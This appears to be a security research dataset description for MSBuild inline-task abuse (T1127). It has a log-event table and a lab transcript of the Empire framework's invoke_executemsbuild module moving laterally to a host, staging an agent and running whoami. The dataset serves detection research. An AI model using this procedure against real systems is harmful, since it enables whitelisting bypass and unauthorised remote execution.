# Empire Invoke Msbuild

MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations.

Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file. Inline Tasks MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution.

## Technique(s) ID

T1127

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_invoke_msbuild.tar.gz](./empire_invoke_msbuild.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18213907

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             796 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |               8 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               1 |
| System                                     | Microsoft-Windows-Kernel-General    | na                                                     |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             437 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             180 |
| Security                                   | Microsoft-Windows-Security-Auditing | Removable Storage                                      |             157 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              63 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              48 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |              25 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |              20 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              17 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              17 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |              17 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |              15 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |              14 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |              11 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Policy Change Events                             |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | File System                                            |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Service Ticket Operations                     |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               6 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |            2667 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |            1217 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             783 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |             416 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             288 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |             179 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File creation time changed (rule: FileCreateTime)      |              45 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              37 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |              25 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |              22 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |              15 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               4 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             660 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Execute a Remote Command                               |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Named Pipe IPC                              |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Starting Command                                       |               1 |

## Attacker Activity

```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_executemsbuild
(Empire: powershell/lateral_movement/invoke_executemsbuild) > info

              Name: Invoke-ExecuteMSBuild
            Module: powershell/lateral_movement/invoke_executemsbuild
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @xorrior

Description:
  This module utilizes WMI and MSBuild to compile and execute
  an xml file containing an Empire launcher

Comments:
  Inspired by @subtee http://subt0x10.blogspot.com/2016/09
  /bypassing-application-whitelisting.html

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  UserName     False                                 UserName if executing with credentials  
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host to target                          
  DriveLetter  False                                 Drive letter to use when mounting the   
                                                     share locally                           
  ProxyCreds   False       default                   Proxy credentials                       
                                                     ([domain\]username:password) to use for 
                                                     request (default, none, or other).      
  FilePath     False                                 Desired location to copy the xml file on
                                                     the target                              
  Agent        True        V6W3TH8Y                  Agent to grab a screenshot from.        
  Listener     True                                  Listener to use.                        
  Proxy        False       default                   Proxy to use for request (default, none,
                                                     or other).                              
  UserAgent    False       default                   User-agent string to use for the staging
                                                     request (default, none, or other).      
  Password     False                                 Password if executing with credentials  

(Empire: powershell/lateral_movement/invoke_executemsbuild) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_executemsbuild) > set Listener https
(Empire: powershell/lateral_movement/invoke_executemsbuild) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
[*] Agent V6W3TH8Y tasked with task ID 5
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_executemsbuild
(Empire: powershell/lateral_movement/invoke_executemsbuild) > 

__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     : 
__DYNASTY        : __PARAMETERS
__RELPATH        : 
__PROPERTY_COUNT : 2
__DERIVATION     : {}
__SERVER         : 
__NAMESPACE      : 
__PATH           : 
ProcessId        : 6732
ReturnValue      : 0
PSComputerName   : 




[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent 38APWSR1 checked in
[+] Initial agent 38APWSR1 from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to 38APWSR1 at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_executemsbuild) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:39:49  https           
 TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:39:49  https           
 EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:39:47  https           

 V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:39:50  https           
 38APWSR1 ps 172.18.39.105   IT001             *SHIRE\pgustavo         MSBuild            5656   5/0.0    2019-05-18 21:39:49  https           

(Empire: agents) >
(Empire: agents) > interact 38APWSR1
(Empire: 38APWSR1) > shell whoami
[*] Tasked 38APWSR1 to run TASK_SHELL
[*] Agent 38APWSR1 tasked with task ID 1
(Empire: 38APWSR1) > shire\pgustavo
..Command execution completed.

(Empire: 38APWSR1) >
```